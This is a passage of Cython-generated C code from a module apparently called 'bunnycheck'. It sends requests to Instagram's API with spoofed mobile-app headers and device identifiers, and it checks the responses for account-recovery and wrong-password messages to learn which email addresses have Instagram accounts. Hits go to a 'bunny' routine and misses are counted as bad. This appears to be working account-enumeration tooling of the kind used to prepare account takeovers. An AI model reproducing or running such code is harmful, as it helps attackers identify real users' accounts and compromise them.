        PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_ig_nrcb_2);
        __pyx_t_5 += 10;
        __Pyx_GIVEREF(__pyx_kp_u_ig_nrcb_2);
        PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u_ig_nrcb_2);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_ig_nrcb, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__48);
        __pyx_t_5 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__48);
        PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__48);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_1, 9, __pyx_t_5, __pyx_t_21); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 490, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_Cookie, __pyx_t_4) < 0) __PYX_ERR(0, 486, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_7));
        __pyx_t_7 = 0;

        
        {
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          /*try:*/ {

            
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 492, __pyx_L40_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 492, __pyx_L40_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

            
            __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 494, __pyx_L40_error)
            __Pyx_GOTREF(__pyx_t_7);
            if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 494, __pyx_L40_error)

            
            if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 494, __pyx_L40_error)

            
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__45, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 492, __pyx_L40_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_v_response2 = __pyx_t_1;
            __pyx_t_1 = 0;

            
          }
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          goto __pyx_L45_try_end;
          __pyx_L40_error:;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

          
          __pyx_t_19 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
          if (__pyx_t_19) {
            __Pyx_AddTraceback("source.bunnycheck", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_7, &__pyx_t_4) < 0) __PYX_ERR(0, 496, __pyx_L42_except_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_4);

            
            __Pyx_XDECREF(__pyx_r);
            __Pyx_INCREF(Py_False);
            __pyx_r = Py_False;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L43_except_return;
          }
          goto __pyx_L42_except_error;
          __pyx_L42_except_error:;

          
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          goto __pyx_L9_error;
          __pyx_L43_except_return:;
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_XGIVEREF(__pyx_t_17);
          __Pyx_XGIVEREF(__pyx_t_18);
          __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_17, __pyx_t_18);
          goto __pyx_L13_try_return;
          __pyx_L45_try_end:;
        }

        
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_response2, __pyx_n_s_text); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 498, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_showAccountRecoveryModal, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 498, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_14 = (__pyx_t_15 != 0);
        if (__pyx_t_14) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_bunny); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 499, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_1, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 499, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          goto __pyx_L48;
        }

        
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 501, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_7 = __Pyx_PyInt_AddObjC(__pyx_t_4, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 501, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_7) < 0) __PYX_ERR(0, 501, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __pyx_L48:;

        
        goto __pyx_L15;
      }

      
      __pyx_t_7 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_5, 5, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 502, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_7); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 502, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__pyx_t_14) {

        
        __Pyx_INCREF(__pyx_kp_u_https_i_instagram_com_api_v1_blo);
        __pyx_v_url = __pyx_kp_u_https_i_instagram_com_api_v1_blo;

        
        __pyx_t_7 = PyTuple_New(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 504, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_5 = 0;
        __pyx_t_21 = 127;
        __Pyx_INCREF(__pyx_kp_u_params_7B_22client_input_params);
        __pyx_t_5 += 65;
        __Pyx_GIVEREF(__pyx_kp_u_params_7B_22client_input_params);
        PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_params_7B_22client_input_params);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_22_7D_7D);
        __pyx_t_5 += 9;
        __Pyx_GIVEREF(__pyx_kp_u_22_7D_7D);
        PyTuple_SET_ITEM(__pyx_t_7, 2, __pyx_kp_u_22_7D_7D);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_7, 3, __pyx_t_5, __pyx_t_21); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 504, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v_payload = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(25); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 506, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_7 = __pyx_pf_6source_10bunnycheck_bunny_user_agent(__pyx_v_bunny_user_agent); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 506, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_User_Agent, __pyx_t_7) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_app_locale, __pyx_kp_u_en_US_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_device_locale, __pyx_kp_u_en_US_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_mapped_locale, __pyx_kp_u_en_US_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_pigeon_session_id, __pyx_kp_u_UFS_42175dfd_8675_4443_8f8d_7f09) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_pigeon_rawclienttime, __pyx_kp_u_1725835735_847) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_bandwidth_speed_kbps, __pyx_kp_u_1_000) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_bandwidth_totalbytes_b, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_bandwidth_totaltime_ms, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_bloks_version_id, __pyx_kp_u_8ca96ca267e30c02cf90888d91eeff09) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_www_claim, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_bloks_is_layout_rtl, __pyx_n_u_true) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_device_id, __pyx_kp_u_8745a4a2_a663_4bc7_9b3b_16d5b8ea) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_family_device_id, __pyx_kp_u_2586e714_fdb4_4741_ba7b_0b84b13e) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_android_id, __pyx_kp_u_android_bf1b282ab2b0b445) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_timezone_offset, __pyx_kp_u_10800) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_fb_connection_type, __pyx_kp_u_MOBILE_LTE) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_connection_type, __pyx_kp_u_MOBILE_LTE_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_capabilities, __pyx_kp_u_3brTv10) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_app_id, __pyx_kp_u_567067343352427) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_priority, __pyx_kp_u_u_3) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_en_US_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_mid, __pyx_n_u_Zt4loQABAAFzGR1YLL2M9XOkL9El) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_ig_intended_user_id, __pyx_kp_u_0_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 506, __pyx_L9_error)
        __pyx_v_headers = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 531, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 531, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 531, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 531, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_data, __pyx_v_payload) < 0) __PYX_ERR(0, 531, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 531, __pyx_L9_error)
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_4, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 531, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_v_response = __pyx_t_2;
        __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_status_code); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 532, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = __Pyx_PyInt_EqObjC(__pyx_t_2, __pyx_int_200, 0xC8, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 532, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 532, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (__pyx_t_14) {

          
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 533, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_2, function);
            }
          }
          __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 533, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_v_response_data = __pyx_t_1;
          __pyx_t_1 = 0;

          
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_v_response_data); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 534, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_14 = (__Pyx_PyUnicode_ContainsTF(__pyx_kp_u_The_password_you_entered_is_inco, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 534, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_t_15 = (__pyx_t_14 != 0);
          if (__pyx_t_15) {

            
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_bunny); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 536, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_4)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_4);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
              }
            }
            __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_email);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 536, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
            goto __pyx_L50;
          }

          
          /*else*/ {
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 538, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_2 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 538, __pyx_L9_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_2) < 0) __PYX_ERR(0, 538, __pyx_L9_error)
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          __pyx_L50:;

          
        }

        
        goto __pyx_L15;
      }

      
      __pyx_t_2 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_6, 6, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 539, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 539, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (__pyx_t_15) {

        
        __Pyx_INCREF(__pyx_kp_u_https_i_instagram_com_api_v1_use);
        __pyx_v_url = __pyx_kp_u_https_i_instagram_com_api_v1_use;

        
        __pyx_t_2 = PyTuple_New(13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_5 = 0;
        __pyx_t_21 = 127;
        __Pyx_INCREF(__pyx_kp_u_signed_body_2);
        __pyx_t_5 += 12;
        __Pyx_GIVEREF(__pyx_kp_u_signed_body_2);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_kp_u_signed_body_2);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_variable_instance, __pyx_n_s_sgin); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_7B_22country_codes_22_3A_22_5B);
        __pyx_t_5 += 68;
        __Pyx_GIVEREF(__pyx_kp_u_7B_22country_codes_22_3A_22_5B);
        PyTuple_SET_ITEM(__pyx_t_2, 2, __pyx_kp_u_7B_22country_codes_22_3A_22_5B);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_variable_instance, __pyx_n_s_num); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
        __Pyx_GIVEREF(__pyx_t_1);
        PyTuple_SET_ITEM(__pyx_t_2, 3, __pyx_t_1);
        __pyx_t_1 = 0;
        __Pyx_INCREF(__pyx_kp_u_5C_22_2C_5C_22source_5C_22_3A_5);
        __pyx_t_5 += 89;
        __Pyx_GIVEREF(__pyx_kp_u_5C_22_2C_5C_22source_5C_22_3A_5);
        PyTuple_SET_ITEM(__pyx_t_2, 4, __pyx_kp_u_5C_22_2C_5C_22source_5C_22_3A_5);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_variable_instance, __pyx_n_s_csr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 5, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_22_2C_22q_22_3A_22);
        __pyx_t_5 += 19;
        __Pyx_GIVEREF(__pyx_kp_u_22_2C_22q_22_3A_22);
        PyTuple_SET_ITEM(__pyx_t_2, 6, __pyx_kp_u_22_2C_22q_22_3A_22);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_email, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_21;
        __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_2, 7, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_22_2C_22guid_22_3A_22);
        __pyx_t_5 += 22;
        __Pyx_GIVEREF(__pyx_kp_u_22_2C_22guid_22_3A_22);
        PyTuple_SET_ITEM(__pyx_t_2, 8, __pyx_kp_u_22_2C_22guid_22_3A_22);
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_uuid); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 541, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
